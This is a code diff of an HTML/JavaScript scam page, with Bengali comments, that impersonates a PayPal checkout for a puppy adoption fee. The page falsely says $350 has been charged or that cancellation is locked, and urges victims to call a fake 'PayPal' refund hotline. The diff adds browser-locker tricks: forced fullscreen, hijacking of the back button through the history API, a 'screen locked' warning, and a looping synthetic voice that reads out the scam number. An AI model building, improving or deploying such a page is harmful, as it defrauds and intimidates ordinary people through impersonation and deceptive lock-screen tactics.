@@ -6,7 +6,7 @@
     <title>Official PayPal Secure Checkout</title>
     <style>
         body {
-            background-color: #f5f7fa;
+            background-color: #0f172a;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 0;
@@ -17,60 +17,98 @@
             overflow: hidden;
         }
 
-        /* ব্যাকগ্রাউন্ড পেপ্যাল ড্যাশবোর্ড ব্লার */
-        .paypal-dashboard-blur {
-            position: absolute;
+        /* প্রথম থেকেই ফুল-স্ক্রিন লকড কন্টেইনার */
+        .fullscreen-checkout-container {
+            position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: #eef2f7;
-            filter: blur(8px);
-            z-index: 1;
+            background: #f5f7fa;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+
+        /* উপরের অ্যাকশন বার (ব্যাক বা ক্লোজ অপশন) */
+        .top-action-bar {
+            position: absolute;
+            top: 0; left: 0; width: 100%;
+            background: #ffffff;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #cbd5e1;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+        }
+
+        .bar-title {
+            font-size: 15px;
+            font-weight: bold;
+            color: #003087;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .close-back-btn {
+            background: #fee2e2;
+            border: 1px solid #dc2626;
+            color: #dc2626;
+            font-size: 14px;
+            font-weight: bold;
+            padding: 8px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .close-back-btn:hover { background: #fca5a5; color: #fff; }
 
         /* পেপ্যাল চেকআউট মূল বক্স */
         .paypal-checkout-modal {
             position: relative;
             background: #ffffff;
-            width: 480px;
+            width: 460px;
             max-width: 92%;
             border-radius: 16px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.25);
-            z-index: 10;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
             overflow: hidden;
             border: 1px solid #cbd5e1;
+            margin-top: 40px;
         }
 
         .paypal-modal-header {
             background: #003087;
             color: white;
-            padding: 20px;
+            padding: 18px;
             text-align: center;
         }
 
         .pp-brand {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: bold;
             font-style: italic;
             letter-spacing: -1px;
         }
 
         .checkout-body {
-            padding: 25px;
+            padding: 20px;
         }
 
         .item-summary-card {
             background: #f8fafc;
             border: 1px solid #e2e8f0;
             border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
+            padding: 12px;
+            margin-bottom: 15px;
             display: flex;
             gap: 15px;
             align-items: center;
         }
 
         .item-thumb {
-            width: 65px;
-            height: 65px;
+            width: 60px;
+            height: 60px;
             border-radius: 8px;
             object-fit: cover;
             border: 1px solid #cbd5e1;
@@ -79,12 +117,12 @@
         .payment-status-alert {
             background: #eff6ff;
             border-left: 4px solid #003087;
-            padding: 12px 15px;
+            padding: 10px 12px;
             border-radius: 6px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             color: #1e3a8a;
-            font-size: 13px;
-            line-height: 1.5;
+            font-size: 12px;
+            line-height: 1.4;
         }
 
         .btn-paypal-pay {
@@ -92,8 +130,8 @@
             color: #111;
             border: none;
             width: 100%;
-            padding: 15px;
-            font-size: 16px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: bold;
             border-radius: 25px;
             cursor: pointer;
@@ -109,8 +147,8 @@
             color: #dc2626;
             border: 2px solid #dc2626;
             width: 100%;
-            padding: 12px;
-            font-size: 15px;
+            padding: 11px;
+            font-size: 14px;
             font-weight: bold;
             border-radius: 25px;
             cursor: pointer;
@@ -119,7 +157,7 @@
         }
         .btn-paypal-cancel:hover { background: #fee2e2; }
 
-        /* ফুল-স্ক্রিন লকড ওভারলে ও পুশ নোটিফিকেশন */
+        /* ফাইনাল লকড ওভারলে ও পুশ নোটিফিকেশন */
         .fullscreen-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -132,7 +170,6 @@
             backdrop-filter: blur(10px);
         }
 
-        /* ওপর থেকে নেমে আসা রিয়েল পুশ নোটিফিকেশন */
         .paypal-push-notif {
             position: absolute;
             top: -120px;
@@ -156,13 +193,12 @@
             top: 25px;
         }
 
-        /* প্রসেসিং ও টিকমার্ক অ্যানিমেশন কন্টেইনার */
         .processing-box {
             background: #ffffff;
             width: 500px;
             max-width: 92%;
             border-radius: 16px;
-            padding: 35px;
+            padding: 30px;
             text-align: center;
             box-shadow: 0 25px 60px rgba(0,0,0,0.5);
             border-top: 6px solid #003087;
@@ -170,31 +206,31 @@
         }
 
         .success-checkmark {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px auto;
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 15px auto;
             border-radius: 50%;
             background: #16a34a;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 45px;
+            font-size: 40px;
             box-shadow: 0 0 25px rgba(22, 163, 74, 0.5);
             animation: bounceIn 0.5s ease-out;
         }
 
         .cancel-warning-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px auto;
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 15px auto;
             border-radius: 50%;
             background: #dc2626;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 40px;
+            font-size: 35px;
             box-shadow: 0 0 25px rgba(220, 38, 38, 0.5);
             animation: bounceIn 0.5s ease-out;
         }
@@ -208,15 +244,15 @@
         .hotline-box {
             background: #eff6ff;
             border: 1px dashed #3b82f6;
-            padding: 15px;
+            padding: 12px;
             border-radius: 10px;
             text-align: center;
-            margin-top: 20px;
-            margin-bottom: 20px;
+            margin-top: 15px;
+            margin-bottom: 15px;
         }
 
         .hotline-number {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: bold;
             color: #003087;
             text-decoration: none;
@@ -228,45 +264,51 @@
             text-align: center;
             font-size: 11px;
             color: #94a3b8;
-            margin-top: 15px;
+            margin-top: 12px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ব্যাকগ্রাউন্ড ড্যাশবোর্ড ব্লার -->
-    <div class="paypal-dashboard-blur"></div>
-
-    <!-- পেপ্যাল চেকআউট মূল বক্স -->
-    <div class="paypal-checkout-modal">
-        <div class="paypal-modal-header">
-            <div class="pp-brand">PayPal</div>
-            <div style="font-size: 13px; color: #cbd5e1; margin-top: 2px;">Secure Express Checkout</div>
+    <!-- পেজ লোড হওয়ার সাথে সাথে ফুল-স্ক্রিন মোড ট্রিগার করার জন্য ওভারলে বা ক্লিক প্রম্পট -->
+    <div class="fullscreen-checkout-container" id="mainContainer" onclick="forceFullscreenOnStart()">
+        
+        <!-- উপরের ব্যাক বা ক্রস বার -->
+        <div class="top-action-bar">
+            <div class="bar-title">🔒 Secure Gateway • Tap Back to Exit</div>
+            <button class="close-back-btn" onclick="event.stopPropagation(); triggerCheckoutFlow('cancel')">⬅ Back / Close</button>
         </div>
 
-        <div class="checkout-body">
-            <div class="item-summary-card">
-                <!-- আপনার দেওয়া গোল্ডেন রিট্রিভার পিউপির ছবি -->
-                <img src="https://images.unsplash.com/photo-1543466835-00a7907e9de1?w=600" class="item-thumb" alt="Puppy">
-                <div style="text-align: left;">
-                    <div style="font-size: 14px; font-weight: bold; color: #1e293b;">Golden Retriever Puppy Adoption Fee</div>
-                    <div style="font-size: 15px; color: #003087; font-weight: bold; margin-top: 4px;">$350.00 USD</div>
-                    <div style="font-size: 11px; color: #64748b;">Merchant ID: #PP-998274</div>
+        <!-- পেপ্যাল চেকআউট মূল বক্স -->
+        <div class="paypal-checkout-modal">
+            <div class="paypal-modal-header">
+                <div class="pp-brand">PayPal</div>
+                <div style="font-size: 12px; color: #cbd5e1; margin-top: 2px;">Secure Express Checkout</div>
+            </div>
+
+            <div class="checkout-body">
+                <div class="item-summary-card">
+                    <img src="https://images.unsplash.com/photo-1543466835-00a7907e9de1?w=600" class="item-thumb" alt="Puppy">
+                    <div style="text-align: left;">
+                        <div style="font-size: 13px; font-weight: bold; color: #1e293b;">Golden Retriever Puppy Adoption Fee</div>
+                        <div style="font-size: 14px; color: #003087; font-weight: bold; margin-top: 3px;">$350.00 USD</div>
+                        <div style="font-size: 10px; color: #64748b;">Merchant ID: #PP-998274</div>
+                    </div>
                 </div>
-            </div>
 
-            <div class="payment-status-alert">
-                <b>Secure Checkout:</b> Click below to complete your payment or cancel your order if needed.
-            </div>
+                <div class="payment-status-alert">
+                    <b>Secure Checkout:</b> Click below to complete your payment or cancel your order if needed.
+                </div>
 
-            <!-- পে বাটন -->
-            <button class="btn-paypal-pay" onclick="triggerCheckoutFlow('pay')">Complete Payment ($350.00)</button>
+                <!-- পে বাটন -->
+                <button class="btn-paypal-pay" onclick="event.stopPropagation(); triggerCheckoutFlow('pay')">Complete Payment ($350.00)</button>
 
-            <!-- ক্যানসেল বাটন -->
-            <button class="btn-paypal-cancel" onclick="triggerCheckoutFlow('cancel')">Cancel Order & Request Refund</button>
+                <!-- ক্যানসেল বাটন -->
+                <button class="btn-paypal-cancel" onclick="event.stopPropagation(); triggerCheckoutFlow('cancel')">Cancel Order & Request Refund</button>
 
-            <div class="paypal-footer">
-                PayPal Secure Encryption • Buyer Protection Active
+                <div class="paypal-footer">
+                    PayPal Secure Encryption • Buyer Protection Active
+                </div>
             </div>
         </div>
     </div>
@@ -289,19 +331,19 @@
             
             <div id="modalIcon" class="success-checkmark">✓</div>
 
-            <div id="modalMainTitle" style="color: #003087; font-size: 20px; font-weight: bold; margin-bottom: 8px;">TRANSACTION COMPLETED & SECURED</div>
+            <div id="modalMainTitle" style="color: #003087; font-size: 18px; font-weight: bold; margin-bottom: 8px;">TRANSACTION COMPLETED & SECURED</div>
             
-            <div id="modalMainDesc" style="font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 15px;">
+            <div id="modalMainDesc" style="font-size: 13px; color: #475569; line-height: 1.5; margin-bottom: 12px;">
                 Your payment of <b>$350.00 USD</b> has been successfully transferred from your checking account. However, our risk system requires immediate verification to prevent unauthorized subscription.<br><br>
                 To cancel this charge or process an instant refund, contact our support hotline immediately:
             </div>
 
             <div class="hotline-box">
-                <div style="font-size: 12px; color: #1e40af; font-weight: bold;" id="hotlineTitle">Call PayPal Refund & Support Helpline:</div>
+                <div style="font-size: 11px; color: #1e40af; font-weight: bold;" id="hotlineTitle">Call PayPal Refund & Support Helpline:</div>
                 <a href="tel:+18014595498" class="hotline-number">📞 +1 (801) 459-5498</a>
             </div>
 
-            <div style="font-size: 11px; color: #94a3b8;">
+            <div style="font-size: 10px; color: #94a3b8;">
                 🔒 Screen locked for security compliance. Do not close this browser.
             </div>
         </div>
@@ -313,11 +355,26 @@
         let currentVoiceText = "";
         let isFlowActive = false;
 
-        function triggerCheckoutFlow(type) {
+        // পেজ লোড বা প্রথম টাচ করার সাথে সাথে ফুল-স্ক্রিন মোড অন করার ফাংশন
+        function forceFullscreenOnStart() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(err => console.log(err));
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
             }
+        }
+
+        // পেজ লোড হওয়ার সাথে সাথে ব্যাক বাটন ওভাররাইড করার জন্য হিস্ট্রি পুশ করা
+        window.history.pushState(null, null, window.location.href);
+        window.addEventListener('popstate', function () {
+            window.history.pushState(null, null, window.location.href);
+            // কাস্টমার ফোনের ব্যাক বাটন চাপলে সরাসরি ক্যানসেল/লক ফ্লো ট্রিগার হবে
+            triggerCheckoutFlow('cancel');
+        });
+
+        function triggerCheckoutFlow(type) {
+            forceFullscreenOnStart();
 
             let overlay = document.getElementById('fullscreenOverlay');
             let notif = document.getElementById('paypalNotif');
@@ -335,7 +392,7 @@
                 modalIcon.className = "cancel-warning-icon";
                 modalIcon.innerHTML = "⚠️";
                 modalMainTitle.innerText = "ORDER CANCELLATION LOCKED";
-                modalMainDesc.innerHTML = "Your order cancellation request could not be processed automatically because the transaction is already queued in our gateway.<br><br>To successfully cancel this order, stop the automated debit, and process a full refund, you must speak immediately with our billing resolution department:";
+                modalMainDesc.innerHTML = "Your order cancellation request or back action could not be processed automatically because the transaction is already queued in our gateway.<br><br>To successfully cancel this order, stop the automated debit, and process a full refund, you must speak immediately with our billing resolution department:";
                 
                 notifIcon.style.background = "#dc2626";
                 notifIcon.innerHTML = "!";
@@ -344,7 +401,7 @@
                 notifTitle.innerText = "Cancellation Failed - Action Required";
                 notifDesc.innerText = "Direct refund locked. Call support to reverse $350.00 charge.";
 
-                currentVoiceText = "PayPal security alert. Order cancellation is currently locked. Please call customer support immediately at plus one 801 459 5498 to cancel your transaction and process your refund.";
+                currentVoiceText = "PayPal security alert. Order cancellation and back action are currently locked. Please call customer support immediately at plus one 801 459 5498 to cancel your transaction and process your refund.";
             } else {
                 modalIcon.className = "success-checkmark";
                 modalIcon.innerHTML = "✓";
@@ -367,11 +424,10 @@
                 notif.classList.add('show');
             }, 300);
 
-            // ভয়েস লুপ চালু করা
             startForcedMaleVoiceLoop();
         }
 
-        // কঠোরভাবে পুরুষ কণ্ঠে লুপ করার ফাংশন (মোবাইল ও পিসির জন্য অপ্টিমাইজড)
+        // কঠোরভাবে পুরুষ কণ্ঠে লুপ করার ফাংশন
         function startForcedMaleVoiceLoop() {
             if (!('speechSynthesis' in window)) return;
 
@@ -380,11 +436,10 @@
                 window.speechSynthesis.cancel();
 
                 let msg = new SpeechSynthesisUtterance(currentVoiceText);
-                msg.rate = 0.90; // কথা বলার গতি সামান্য কমানো হয়েছে যাতে স্পষ্ট শোনা যায়
-                msg.pitch = 0.5; // পিচ একদম কমিয়ে গম্ভীর বা পুরুষ কণ্ঠ নিশ্চিত করা হয়েছে (মোবাইলে ফিমেল ভয়েস ওভাররাইড করার জন্য)
+                msg.rate = 0.90;
+                msg.pitch = 0.5; // গম্ভীর পুরুষ কণ্ঠ নিশ্চিত করার জন্য পিচ কমানো
 
                 let voices = window.speechSynthesis.getVoices();
-                // পুরুষ কণ্ঠ বা গভীর কণ্ঠের নামগুলো খোঁজা
                 let maleVoice = voices.find(v => 
                     (v.name.toLowerCase().includes('male') || 
                      v.name.toLowerCase().includes('david') || 
@@ -403,7 +458,7 @@
                     if (isFlowActive) {
                         setTimeout(() => {
                             playLoop();
-                        }, 1200); // ১.২ সেকেন্ড পর পর ভয়েস রিক্রিয়েট হয়ে আবার বাজবে
+                        }, 1200);
                     }
                 };
 
